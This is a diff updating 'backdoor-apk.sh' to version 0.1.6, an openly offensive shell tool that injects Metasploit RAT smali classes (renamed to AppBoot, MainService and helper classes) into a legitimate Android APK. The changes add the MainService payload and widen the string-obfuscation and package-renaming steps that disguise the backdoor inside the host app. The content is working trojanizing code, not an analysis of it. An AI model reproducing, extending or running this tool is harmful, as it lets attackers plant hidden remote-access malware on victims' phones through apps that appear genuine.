@@ -2,7 +2,7 @@
 
 # file: backdoor-apk.sh
 
-# version: 0.1.5
+# version: 0.1.6
 
 # usage: ./backdoor-apk.sh original.apk
 
@@ -10,7 +10,9 @@
 # Security Engineer
 # Check Point Software Technologies, Ltd.
 
-# IMPORTANT: The following packages were required on Kali Linux in order to get things rolling. These packages are likely required by other Linux distros as well.
+# IMPORTANT: The following packages were required on Kali Linux
+#   in order to get things rolling. These packages are likely
+#   required by other Linux distros as well.
 # apt-get install lib32z1 lib32ncurses5 lib32stdc++6
 
 PAYLOAD=""
@@ -72,16 +74,16 @@ cat << "EOF"
           ________
          / ______ \
          || _  _ ||
-         ||| || |||          AAAAAA      PPPPPPP    KKK  KKK
-         |||_||_|||         AAA  AAA     PPP  PPP   KKK KKK
-         || _  _o|| (o)    AAAA  AAAA    PPP  PPPP  KKKKKK
-         ||| || |||       AAAAAAAAAAAA   PPPPPPPP   KKK KKK
-         |||_||_|||      AAAA      AAAA  PPPP       KKK  KKK
-         ||______||     AAAA        AAAA PPPP       KKK  KKKK
+         ||| || |||          AAAAAA   PPPPPPP   KKK  KKK
+         |||_||_|||         AAA  AAA  PPP  PPP  KKK KKK
+         || _  _o|| (o)     AAA  AAA  PPP  PPP  KKKKKK
+         ||| || |||         AAAAAAAA  PPPPPPPP  KKK KKK
+         |||_||_|||         AAA  AAA  PPP       KKK  KKK
+         ||______||         AAA  AAA  PPP       KKK  KKK
         /__________\
 ________|__________|__________________________________________
        /____________\
-       |____________|             Dana James Traversie
+       |____________|            Dana James Traversie
 
 EOF
 }
@@ -149,7 +151,7 @@ function get_lport {
 function init {
   echo "Running backdoor-apk at $TIME_OF_RUN" >$LOG_FILE 2>&1
   print_ascii_art
-  echo "[*] Running backdoor-apk.sh v0.1.5 on $TIME_OF_RUN"
+  echo "[*] Running backdoor-apk.sh v0.1.6 on $TIME_OF_RUN"
   consult_which $MSFVENOM
   consult_which $DEX2JAR
   consult_which $UNZIP
@@ -308,7 +310,11 @@ echo -n "[*] Copying RAT smali files to new directories in original project..."
 cp -v $MY_PATH/payload/smali/com/metasploit/stage/MainBroadcastReceiver.smali $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/AppBoot.smali >>$LOG_FILE 2>&1
 rc=$?
 if [ $rc == 0 ]; then
-  cp -v $MY_PATH/payload/smali/net/dirtybox/util/{a.smali,b.smali,c.smali,d.smali} $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/ >>$LOG_FILE 2>&1
+  cp -v $MY_PATH/payload/smali/com/metasploit/stage/MainService.smali $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/MainService.smali >>$LOG_FILE 2>&1
+  rc=$?
+fi
+if [ $rc == 0 ]; then
+  cp -v $MY_PATH/payload/smali/net/dirtybox/util/*.smali $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/ >>$LOG_FILE 2>&1
   rc=$?
 fi
 echo "done."
@@ -322,11 +328,11 @@ echo -n "[*] Fixing RAT smali files..."
 sed -i 's/MainBroadcastReceiver/AppBoot/g' $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/AppBoot.smali >>$LOG_FILE 2>&1
 rc=$?
 if [ $rc == 0 ]; then
-  sed -i 's|com\([./]\)metasploit\([./]\)stage|'"$payload_tld"'\1'"$payload_primary_dir"'\2'"$payload_sub_dir"'|g' $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/AppBoot.smali >>$LOG_FILE 2>&1
+  sed -i 's|com\([./]\)metasploit\([./]\)stage|'"$payload_tld"'\1'"$payload_primary_dir"'\2'"$payload_sub_dir"'|g' $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/{AppBoot.smali,MainService.smali} >>$LOG_FILE 2>&1
   rc=$?
 fi
 if [ $rc == 0 ]; then
-  sed -i 's|net\([./]\)dirtybox\([./]\)util|'"$payload_tld"'\1'"$payload_primary_dir"'\2'"$payload_sub_dir"'|g' $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/{a.smali,b.smali,c.smali,d.smali,AppBoot.smali} >>$LOG_FILE 2>&1
+  sed -i 's|net\([./]\)dirtybox\([./]\)util|'"$payload_tld"'\1'"$payload_primary_dir"'\2'"$payload_sub_dir"'|g' $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/*.smali >>$LOG_FILE 2>&1
   rc=$?
 fi
 echo "done."
@@ -343,10 +349,12 @@ cat >$MY_PATH/obfuscate.method <<EOL
 
     move-result-object ###REG###
 EOL
-sed -i 's/[[:space:]]*"$/"/g' $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/{a.smali,b.smali,c.smali} >>$LOG_FILE 2>&1
+helper_class=`ls $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/*.smali |grep -v "AppBoot" |grep -v "MainService" |sort -r |head -n 1 |sed "s:$MY_PATH/original/smali/::g" |sed "s:.smali::g"`
+echo "Helper class: $helper_class" >>$LOG_FILE 2>&1
+sed -i 's/[[:space:]]*"$/"/g' $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/*.smali >>$LOG_FILE 2>&1
 rc=$?
 if [ $rc == 0 ]; then
-  grep "const-string" $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/{a.smali,b.smali,c.smali} |while read -r line; do
+  grep "const-string" $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/*.smali |while read -r line; do
     file=`echo $line |awk -F ": " '{ print $1 }'`
     echo "File: $file" >>$LOG_FILE 2>&1
     target=`echo $line |awk -F ", " '{ print $2 }'`
@@ -376,8 +384,9 @@ if [ $rc == 0 ]; then
     fi
   done
   if [ ! -f $MY_PATH/obfuscate.error ]; then
-    class="$payload_tld/$payload_primary_dir/$payload_sub_dir/d"
-    sed -i 's|###CLASS###|'"$class"'|' $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/{a.smali,b.smali,c.smali}
+    #class="$payload_tld/$payload_primary_dir/$payload_sub_dir/e"
+    class="$helper_class"
+    sed -i 's|###CLASS###|'"$class"'|' $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/*.smali
     rc=$?
   else
     rm -v $MY_PATH/obfuscate.error >>$LOG_FILE 2>&1
